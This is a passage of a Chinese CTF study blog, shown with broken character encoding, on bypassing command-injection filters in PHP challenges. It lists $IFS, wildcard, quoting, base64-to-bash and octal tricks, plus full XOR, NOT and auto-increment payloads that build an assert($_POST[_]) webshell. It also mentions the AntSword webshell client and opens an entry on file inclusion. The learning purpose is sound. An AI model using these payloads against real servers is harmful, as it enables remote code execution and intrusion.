<h5 id="IFS-ä»£æ›¿ç©ºæ ¼"><a href="#IFS-ä»£æ›¿ç©ºæ ¼" class="headerlink" title="$IFS ä»£æ›¿ç©ºæ ¼"></a>$IFS ä»£æ›¿ç©ºæ ¼</h5><p>&emsp;&emsp;è¿™ä¸ªå»ºè®®å»kaliç”¨ä¸€ä¸‹ï¼ŒåŸç†å°±æ˜¯Linuxä¸‹æœ‰ä¸€ä¸ªç‰¹æ®Šçš„ç¯å¢ƒå˜é‡å«åšIFSï¼Œå«åšå†…éƒ¨å­—æ®µåˆ†éš”ç¬¦ï¼Œæ—¢ç„¶æ˜¯åˆ†éš”ç¬¦ï¼Œå°±èƒ½èµ·åˆ°ç©ºæ ¼çš„ä½œç”¨ã€‚é€šå¸¸èƒ½å•çº¯çš„$IFSä¼šè¢«å½“ä½œå˜é‡åï¼Œå°±åŠ ä¸€å¯¹{}å›ºå®šå˜é‡åæ‰€ä»¥å°±æ˜¯${IFS}ï¼Œä¾‹å¦‚<font color=blue>ls${IFS}-l</font><br>&emsp;&emsp;å†è€…å°±æ˜¯$IFS$9ï¼Œåé¢åŠ ä¸ª$å’Œ{}ç±»ä¼¼ï¼Œèµ·æˆªæ–­ä½œç”¨ï¼Œ$9æ˜¯å½“å‰ç³»ç»Ÿshellè¿›ç¨‹çš„ç¬¬ä¹ä¸ªå‚æ•°ï¼Œä»£è¡¨è¿™ç©ºå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥è¿™ä¹Ÿæ˜¯ä¸€ç§,ä¾‹å¦‚<font color=red>ls$IFS$9-l</font><br>&emsp;&emsp;è¿™ä¸¤ä¸ªåœ¨é¢˜ç›®ä¸­æœ€å¸¸ç”¨ä¹Ÿæœ€å¥½ç”¨äº†ï¼Œè¦çŸ¥é“ã€‚  </p>
<h5 id="URLç¼–ç "><a href="#URLç¼–ç " class="headerlink" title="URLç¼–ç "></a>URLç¼–ç </h5><p>&emsp;&emsp;å°±æ˜¯ä½¿ç”¨ç©ºæ ¼å’Œåˆ¶è¡¨ç¬¦çš„URLç¼–ç ä»£æ›¿ç©ºæ ¼ï¼Œåœ¨æ‰§è¡Œæ˜¯ä¼šè‡ªåŠ¨è½¬æ¢ä¸ºç©ºæ ¼ä½¿ç”¨ï¼Œ%09ï¼ˆtabï¼‰%20ï¼ˆspaceï¼‰ï¼Œä¾‹å¦‚<font color=blue>cat%09flag.php</font>å’Œ<font color=red>cat%20flag.php</font></p>
<h5 id="é‡å®šå‘å­—ç¬¦"><a href="#é‡å®šå‘å­—ç¬¦" class="headerlink" title="é‡å®šå‘å­—ç¬¦&lt;,&lt;&gt;"></a>é‡å®šå‘å­—ç¬¦&lt;,&lt;&gt;</h5><p>&emsp;&emsp;ä¸Šé¢ä¹Ÿæè¿‡ä¸€å˜´ï¼Œå°±æ˜¯æŠŠ&lt;åé¢è·Ÿçš„æ–‡ä»¶å–ä»£é”®ç›˜ä½œä¸ºæ–°çš„è¾“å…¥è®¾å¤‡ï¼Œå…·ä½“åŸç†æˆ‘ä¹Ÿä¸æ¸…æ¥šï¼ˆè°ä¼šäº†åˆ°æ—¶å€™æŒ‡å¯¼æˆ‘ä¸€ä¸‹ãƒ¾(â€â•¹â—¡â•¹)ï¾‰ï¾â€~ï¼‰ï¼Œä¸æ¨èä½¿ç”¨ï¼Œç”¨æ³•1ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span>&lt;flag.php</span><br><span class="line"><span class="built_in">cat</span>&lt;&gt;flag.php</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;è€Œè¿™å¦ä¸€ç§ç”¨æ³•è¾ƒä¸ºå¹¿æ³›ï¼Œä¾‹å¦‚é¢˜ç›®ä¸­å‡ºç°ç±»ä¼¼ä¸shell_exec()è¿™ç§å‡½æ•°æ²¡æœ‰å›æ˜¾çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨é‡å®šå‘ï¼Œå°†ç»“æœæ”¾å…¥æŒ‡å®šçš„æ–‡ä»¶ä¸­,ç”¨æ³•2:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> / &gt; 1.txt</span><br><span class="line"><span class="built_in">cat</span> /flag &gt; 2.txt</span><br></pre></td></tr></table></figure>

<h4 id="ç‰¹å®šå­—ç¬¦è¿‡æ»¤ç»•è¿‡"><a href="#ç‰¹å®šå­—ç¬¦è¿‡æ»¤ç»•è¿‡" class="headerlink" title="ç‰¹å®šå­—ç¬¦è¿‡æ»¤ç»•è¿‡"></a>ç‰¹å®šå­—ç¬¦è¿‡æ»¤ç»•è¿‡</h4><p>&emsp;&emsp;è¿™ç§è¿‡æ»¤ä¸€èˆ¬é’ˆå¯¹ä¸€äº›ç‰¹å®šçš„å­—ç¬¦ï¼Œå…¨è¿‡æ»¤çš„åœ¨åé¢ï¼Œæ¯”å¦‚flagè¿™å››ä¸ªï¼Œæˆ–è€…f,l,a,gå››ä¸ªå­—ç¬¦å•ç‹¬è¿‡æ»¤ï¼Œåè€…æ„å‘³è¿™ä¸èƒ½æœ‰è¿™å››ä¸ªå­—æ¯çš„å‡ºç°ï¼Œå‰è€…åªæ˜¯å®ƒä»¬ä¸èƒ½è¿ç€ï¼Œå¾ˆæ˜¾ç„¶ï¼Œåè€…ç›¸å¯¹éš¾å¤„ç†äº›ï¼Œé‚£ä¹ˆï¼Œå°±çœ‹çœ‹æœ‰å“ªäº›æ–¹æ³•å§ã€‚</p>
<h5 id="é€šé…ç¬¦ç»•è¿‡"><a href="#é€šé…ç¬¦ç»•è¿‡" class="headerlink" title="é€šé…ç¬¦ç»•è¿‡"></a>é€šé…ç¬¦ç»•è¿‡</h5><p>&emsp;&emsp;é€šé…ç¬¦æ˜¯æ•´ä¸ªæ“ä½œç³»ç»Ÿéƒ½è®¤å¯çš„ä¸€ç§å½¢å¼ï¼Œç”¨æ¥æ¨¡ç³Šæœç´¢æ–‡ä»¶ã€‚åªæœ‰è¿™ä¸¤ä¸ª?å’Œ*<br>&emsp;&emsp;?å¯ä»¥ä»£è¡¨ä»»ä½•<code>å•ä¸ª</code>å­—ç¬¦ä¸²ï¼Œæ¥è®©ç³»ç»Ÿè‡ªè¡Œç»§ç»­åŒ¹é…æœç´¢ã€‚ä¾‹å¦‚<font color=blue>cat fl?g.tx?</font><br>&emsp;&emsp;*å¯ä»¥è¿›è¡Œæ¨¡ç³ŠåŒ¹é…ï¼Œä»£è¡¨ä»»ä½•å­—ç¬¦ä¸²ï¼Œè®©ç³»ç»Ÿè‡ªå·±çŒœæˆ‘è¦ä»€ä¹ˆ- Í€Ì—(à¹‘áµ”âŒ”áµ”à¹‘)ã€‚ä¾‹å¦‚<font color=red>cat f*</font>(å¦‚æœæœ‰å¤šä¸ªåŒ¹é…ç»“æœä¼šåŒæ—¶æ˜¾ç¤º)</p>
<h5 id="å•åŒå¼•å·ç»•è¿‡"><a href="#å•åŒå¼•å·ç»•è¿‡" class="headerlink" title="å•åŒå¼•å·ç»•è¿‡"></a>å•åŒå¼•å·ç»•è¿‡</h5><p>&emsp;&emsp;åŸç†å°±æ˜¯æ¥ä¸€ä¸ªâ€™â€™æˆ–è€…â€â€é‡Œé¢ä»€ä¹ˆéƒ½æ²¡æœ‰é»˜è®¤ç©ºå­—ç¬¦ï¼Œç„¶åç³»ç»Ÿå†æ‹¼æ¥åœ¨ä¸€èµ·ï¼Œä¾‹å¦‚<font color=blue>cat flâ€™â€™ag.phâ€â€p</font></p>
<h5 id="åæ–œæ ç»•è¿‡"><a href="#åæ–œæ ç»•è¿‡" class="headerlink" title="åæ–œæ ç»•è¿‡"></a>åæ–œæ ç»•è¿‡</h5><p>&emsp;&emsp;è¿™ä¸ªå°±æ˜¯å°†ç‰¹æ€§å­—ç¬¦å»æ‰åŠŸèƒ½æ€§ï¼Œå•çº¯è¡¨ç¤ºä¸ºå­—ç¬¦ä¸²ï¼Œæ¯”å¦‚åå¼•å·ï¼Œè¦æƒ³è¡¨ç°å‡ºæ¥å¾—åœ¨å‰é¢åŠ , æ¯”å¦‚â€`â€œ(è¿™é‡Œæˆ‘åŠ äº†,åªæ˜¯ä½ ä»¬çœ‹ä¸åˆ°è€Œå·²)åŒç†ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç”¨å®ƒå°†ä»–ä»¬åˆ†éš”å¼€ï¼Œåœ¨å‘½ä»¤ä¸­åŒæ ·æœ‰æ•ˆï¼Œä¾‹å¦‚<font color=red>cat fl\ag.t\xt</font>  </p>
<h5 id="ç‰¹æ®Šå˜é‡"><a href="#ç‰¹æ®Šå˜é‡" class="headerlink" title="ç‰¹æ®Šå˜é‡"></a>ç‰¹æ®Šå˜é‡</h5><p>&emsp;&emsp;ä¸Šé¢å°±æœ‰æåˆ°ï¼Œ$9ä½œä¸ºç‰¹æ®Šçš„ç¯å¢ƒå˜é‡ï¼Œä»£è¡¨ç€ç©ºå­—ç¬¦ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥ç”¨ï¼Œä¾‹å¦‚<font color=blue>cat fl$9.txt</font>  </p>
<h5 id="å†…è”æ‰§è¡Œ"><a href="#å†…è”æ‰§è¡Œ" class="headerlink" title="å†…è”æ‰§è¡Œ"></a>å†…è”æ‰§è¡Œ</h5><p>&emsp;&emsp; ä¹‹å‰ä¸æ˜¯è¯´è¿‡æ“ä½œç³»ç»Ÿé“¾æ¥ç¬¦å¯ä»¥é¡ºåºå˜›ï¼Œæˆ‘ä»¬å°±å¯ä»¥å…ˆè‡ªå®šä¹‰å­—ç¬¦ä¸²ï¼Œå†æ‹¼æ¥èµ·æ¥,ä¾‹å¦‚<font color=red>a&#x3D;f;d&#x3D;ag;c&#x3D;l;cat $a$c$d.txt</font>  </p>
<h5 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h5><p>&emsp;&emsp;ä¼—æ‰€å‘¨çŸ¥ï¼Œç›®æ ‡æœåŠ¡å™¨åœ¨è¯†åˆ«åˆ°ç¼–ç åä¼šè‡ªåŠ¨è§£ç è¯»å–å‘½ä»¤å¹¶æ‰§è¡Œï¼Œå°±å¯ä»¥ç»•è¿‡é‚£ä¸ªç¬¨æ¯”æ£€æµ‹äº†ï¼ˆï¼µãƒ»Ï‰ãƒ»ï¼‰âŠƒ<br>&emsp;&emsp;æ¯”å¦‚æœ€ç†Ÿæ‚‰çš„baseç¼–ç ï¼ˆ64,32éƒ½å¯ï¼‰ï¼Œå°†å‘½ä»¤ç¼–ç ä¸€ä¸‹å†ä¼ è¾“å°±å¯ä»¥äº†ã€‚é€šå¸¸é€šè¿‡ç®¡é“ç¬¦æ‰§è¡Œå‘½ä»¤ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> Y2FOIGZsYWcucGhw | <span class="built_in">base64</span> -d  | bash</span><br></pre></td></tr></table></figure>

<h5 id="é‡å®šå‘ç»•è¿‡"><a href="#é‡å®šå‘ç»•è¿‡" class="headerlink" title="é‡å®šå‘ç»•è¿‡"></a>é‡å®šå‘ç»•è¿‡</h5><p>&emsp;&emsp;å‘ï¼Œåˆæ˜¯è¿™ä¸¤ä¸ª&gt;,&gt;&gt;ã€‚çŸ¥é“ä¸€ä¸‹å°±å¯ä»¥ï¼ˆå…¶å®æ˜¯æˆ‘ä¹Ÿä¸æ“…é•¿dogeï¼‰ï¼Œé€šå¸¸ç”¨æ¥åšé•¿åº¦é™åˆ¶ç»•è¿‡çš„ï¼Œä¸å¸¸ç”¨ã€‚  </p>
<p>  &emsp;&emsp;ä¸‹é¢çš„æ–¹æ³•ä¸“é—¨é’ˆå¯¹å•ç‹¬è¿‡æ»¤æƒ…å†µã€‚  </p>
<h5 id="åˆ©ç”¨Linuxçš„ç¯å¢ƒå˜é‡å’ŒåŒºé—´å–å€¼"><a href="#åˆ©ç”¨Linuxçš„ç¯å¢ƒå˜é‡å’ŒåŒºé—´å–å€¼" class="headerlink" title="åˆ©ç”¨Linuxçš„ç¯å¢ƒå˜é‡å’ŒåŒºé—´å–å€¼"></a>åˆ©ç”¨Linuxçš„ç¯å¢ƒå˜é‡å’ŒåŒºé—´å–å€¼</h5><p>&emsp;&emsp;åœ¨Linuxä¸­PATHæ˜¯é»˜è®¤ç³»ç»Ÿç¯å¢ƒå˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç‰¹æ®Šçš„è°ƒç”¨æ–¹æ³•ï¼Œæ¥æå–ç›¸åº”çš„å­—ç¬¦ï¼Œæ¯ä¸ªå­—ç¬¦å¯¹åº”ä¸€ä¸ªä¸‹æ ‡ï¼Œä»0å¼€å§‹ï¼Œè·Ÿæ•°ç»„ä¸€æ ·ã€‚ä½†æœ‰é™ï¼Œè®ºå¥½ç”¨è¿˜å¾—æ˜¯åŒºé—´å–å€¼ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> f<span class="variable">$&#123;PATH:5:1&#125;</span><span class="variable">$&#123;PATH:8:1&#125;</span><span class="variable">$&#123;PATH:72:1&#125;</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;åŒºé—´å–å€¼å°±æ˜¯é¡¾åæ€ä¹‰ï¼Œç”¨[]æ¡†èµ·æ¥è¡¨ç¤ºèŒƒå›´ï¼Œç„¶åè®©Linuxè‡ªè¡ŒåŒ¹é…ã€‚é¡ºå¸¦æä¸€å¥ï¼Œå…«è¿›åˆ¶ä¹Ÿå¯ä»¥æ‰§è¡Œã€‚</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">more <span class="selector-attr">[d-h]</span><span class="selector-attr">[k-m]</span><span class="selector-attr">[9-z]</span><span class="selector-attr">[e-h]</span></span><br><span class="line">$<span class="string">&#x27;\143\141\164&#x27;</span> $<span class="string">&#x27;\146\154\141\147&#x27;</span>  <span class="comment">//cat flag</span></span><br></pre></td></tr></table></figure>
<p><img data-src="/images/PATH.png" alt="PATH"></p>
<h4 id="æ— å­—æ¯æ•°å­—ç»•è¿‡"><a href="#æ— å­—æ¯æ•°å­—ç»•è¿‡" class="headerlink" title="æ— å­—æ¯æ•°å­—ç»•è¿‡"></a>æ— å­—æ¯æ•°å­—ç»•è¿‡</h4><p>&emsp;&emsp;ä¸Šé¢é‚£ä¸ªåªæ˜¯è¿‡æ»¤äº†ä¸€äº›ç‰¹å®šå­—ç¬¦ï¼Œè€Œè¿™ç§ä¸ä»…è¿‡æ‰äº†æ‰€æœ‰å­—æ¯ï¼Œè¿˜æœ‰æ•°å­—ã€‚é‚£è¯¥æ€ä¹ˆåŠå‘¢ï¼Œè¿˜æœ‰ç¬¦å·å‘¢ï¼ï¼ï¼æˆ‘ä»¬åªéœ€æ„é€ å‡ºæ–°çš„å˜é‡å°±å¯ä»¥è·‘å»é‚£è¾¹shelläº†ã€‚ç»Ÿä¸€æ„é€ <code>assert($_POST[])</code>ã€‚è€Œä¸èƒ½ä½¿ç”¨çš„å­—ç¬¦æ•°å­—æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>URL ç¼–ç </code>ç»•è¿‡ã€‚<font color=black>æ³¨ï¼šé’ˆå¯¹php5ç‰ˆæœ¬ï¼Œåœ¨å­¦webçš„æ—¶å€™ï¼Œè¦å¯¹ç‰ˆæœ¬å¾ˆæ•æ„Ÿï¼Œä¸åŒçš„ç‰ˆæœ¬æœ‰ä¸åŒçš„ç‰¹æ€§å’Œæ–¹æ³•ã€‚</font></p>
<h5 id="å¼‚æˆ–è¿ç®—ç»•è¿‡"><a href="#å¼‚æˆ–è¿ç®—ç»•è¿‡" class="headerlink" title="å¼‚æˆ–è¿ç®—ç»•è¿‡"></a>å¼‚æˆ–è¿ç®—ç»•è¿‡</h5><p>&emsp;&emsp;å¼‚æˆ–^å°±æ˜¯ä¸¤ä½å¯¹è±¡è½¬æˆäºŒè¿›åˆ¶0å’Œ1ç›¸æ¯”è¾ƒï¼Œæ—¢ç„¶å¼‚æˆ–å¯ä»¥ï¼Œé‚£ä¹ˆå•ç‹¬çš„æˆ–|å’Œä¸&amp;ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œ<font color=pink>ç›¸åŒä¸ºé›¶ï¼Œä¸åŒä¸º1ã€‚</font>æ ¹æ®ä¸Šé¢æ‰€è¯´çš„ï¼Œåˆ™æœ‰a:â€™%40â€™^â€™%21â€™ ; s:â€™%7Bâ€™^â€™%08â€™ ; s:â€™%7Bâ€™^â€™%08â€™ ; e:â€™%7Bâ€™^â€™%1Eâ€™ ; r:â€™%7Eâ€™^â€™%0Câ€™ ; t:â€™%7Câ€™^â€™%08â€™; P:â€™%0Dâ€™^â€™%5Dâ€™ ; O:â€™%0Fâ€™^â€™%40â€™ ; S:â€™%0Eâ€™^â€™%5Dâ€™ ; T:â€™%0Bâ€™^â€™%5Fâ€™<br>&emsp;&emsp;æ‹¼æ¥èµ·æ¥å°±ä¸ºï¼š</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%40&#x27;</span>^<span class="string">&#x27;%21&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%1E&#x27;</span>).(<span class="string">&#x27;%7E&#x27;</span>^<span class="string">&#x27;%0C&#x27;</span>).(<span class="string">&#x27;%7C&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>);<span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0F&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0B&#x27;</span>^<span class="string">&#x27;%5F&#x27;</span>);<span class="variable">$___</span>=$<span class="variable">$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]); <span class="regexp">//</span>assert(<span class="variable">$_POST</span>[_]);</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp; ç„¶åPOSTé‚£è¾¹å°±å¯ä»¥å‘½ä»¤æ‰§è¡Œäº†ï¼Œä¾‹å¦‚<font color=blue>_&#x3D;system(â€œcat flag.phpâ€)</font></p>
<h5 id="å–åç»•è¿‡"><a href="#å–åç»•è¿‡" class="headerlink" title="å–åç»•è¿‡"></a>å–åç»•è¿‡</h5><p>&emsp;&emsp;å–å~å°±æ˜¯assertå’Œ_POSTå–åï¼ˆåºŸè¯ï¼‰ï¼Œå°±ä¸å¤šè¯´äº†ï¼Œç›´æ¥ä¸Špayload</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">$_=~(%9E%8C%8C%9A%8D%8B);$__=~(%A0%AF%B0%AC%AB);$___=$$__;$_($___[_]);</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;å®ƒè¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼Œå°±æ˜¯æ–‡å­—å–åï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥å»æœæœã€‚å®ƒçš„payloadæœ‰ç‚¹é•¿ï¼Œå¯ä»¥å…ˆå»æœ¬åœ°è¯•ä¸€ä¸‹ã€‚</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">%24_%2B%2B%3B%24__%20%3D%20%22%E6%9E%81%22%3B%24___%20%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%8C%BA%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E7%9A%AE%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%8D%81%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%8B%BA%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24____%20%3D%20<span class="string">&#x27;_&#x27;</span>%3B%24__%20%3D%20%22%E5%AF%B8%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%B0%8F%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E6%AC%A0%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E7%AB%8B%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24_%20%3D%20%24%24____%3B%24___(%24_%5B_%5D)%3B</span><br></pre></td></tr></table></figure>

<h5 id="è‡ªå¢ç»•è¿‡"><a href="#è‡ªå¢ç»•è¿‡" class="headerlink" title="è‡ªå¢ç»•è¿‡"></a>è‡ªå¢ç»•è¿‡</h5><p>&emsp;&emsp;åŸç†å°±æ˜¯, å—¯â€¦â€¦ï¼Œç›´æ¥çœ‹å…¶ä»–å¸ˆå‚…çš„å§ï¼š<a href="https://www.cnblogs.com/pursue-security/p/15404150.html">æ— å­—æ¯æ•°å­—</a>ï¼Œä»–é‚£è¾¹çš„payloadè·Ÿæˆ‘çš„æ˜¯ä¸€æ ·ï¼Œç”šè‡³å‰é¢è¿˜æœ‰æºç å’Œè§£é‡Šã€‚</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B<span class="string">&#x27;!&#x27;</span>%3D%3D<span class="string">&#x27;%40&#x27;</span>%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D<span class="string">&#x27;_&#x27;</span>%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___(%24_%5B_%5D)%3B</span><br></pre></td></tr></table></figure>

<h3 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h3><p>&emsp;&emsp;ä½ å·²ç»åˆ’åˆ°è¿™äº†ï¼Œæˆ‘å°±é»˜è®¤ä½ çœ‹å®Œäº†å“ˆã€‚æ­å–œä½ ï¼Œå·²ç»å­¦äº†å¾ˆå¤šçŸ¥è¯†äº†ï¼Œå½“ç„¶è¿˜æœ‰æ›´å¤šçš„çŸ¥è¯†ç­‰ç€ä½ ï¼Œä¸çŸ¥é“ä½ æœ‰æ²¡æœ‰çœ‹å®Œå¦å¤–ä¸¤å¤§çŸ¥è¯†ç‚¹å‘¢â€”â€”&gt;æ–‡ä»¶åŒ…å«ï¼Œæ–‡ä»¶ä¸Šä¼ ã€‚è¿™ä¸‰ä¸ªç»Ÿç§°ä¸ºWEBä¸‰å·¨å¤´ï¼Œåé¢è¿˜æœ‰SQLï¼ŒSSTIï¼Œååºåˆ—ç­‰çŸ¥è¯†æœŸå¾…ä½ æ¥å­¦ï¼Œåˆ«ç€æ€¥ï¼Œæ…¢æ…¢æ¥ã€‚ ( à©­ Ë™á—œË™ )à©­</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>å‘½ä»¤æ‰§è¡Œ</tag>
      </tags>
  </entry>
  <entry>
    <title>èšå‰‘</title>
    <url>/2024/08/03/%E8%9A%81%E5%89%91/</url>
    <content><![CDATA[<p>&emsp;&emsp;èšå‰‘æ˜¯ä¸€ä¸ªshellæ§åˆ¶ç«¯è½¯ä»¶ï¼Œæœ€æ ¸å¿ƒçš„åŠŸèƒ½å°±æ˜¯è·å–ç½‘ç«™çš„æºç å’Œæ‰§è¡Œshellï¼ŒåŒæ—¶å…·å¤‡æ’ä»¶çš„åŠŸèƒ½ï¼ŒåŠŸèƒ½æ€§å¾ˆå¼ºå¤§çš„ä¸€æ¬¾ï¼ŒåŒæ—¶æ­é…æœ¨é©¬ä¸Šä¼ ä½¿ç”¨ï¼Œä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åç”¨èšå‰‘è¿æ¥ã€‚é“¾æ¥å¦‚ä¸‹:<a href="https://blog.csdn.net/weixin_42474304/article/details/116376746">èšå‰‘ä¸‹è½½å’Œå®‰è£…</a>,å®ç”¨æŒ‡æ•°:â­â­â­â­â­</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>å·¥å…·|è„šæœ¬ åˆ©ç”¨</tag>
      </tags>
  </entry>
  <entry>
    <title>æ–‡ä»¶åŒ…å«</title>
    <url>/2024/07/13/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<p>&emsp;&emsp;é€šè¿‡includeæˆ–requireè¯­å¥ï¼Œå¯ä»¥å°†PHPæ–‡ä»¶çš„å†…å®¹æ’å…¥å¦ä¸€ä¸ªPHPæ–‡ä»¶ï¼ˆåœ¨æœåŠ¡å™¨æ‰§è¡Œå®ƒä¹‹å‰ï¼‰<br>&emsp;&emsp;<strong>includeå’Œrequireè¯­å¥æ˜¯ç›¸åŒçš„ï¼Œé™¤äº†é”™è¯¯å¤„ç†æ–¹é¢</strong></p>
<ul>
<li>requireä¼šç”Ÿæˆè‡´å‘½é”™è¯¯ï¼ˆE_COMPILE_ERRORï¼‰å¹¶åœæ­¢è„šæœ¬  </li>
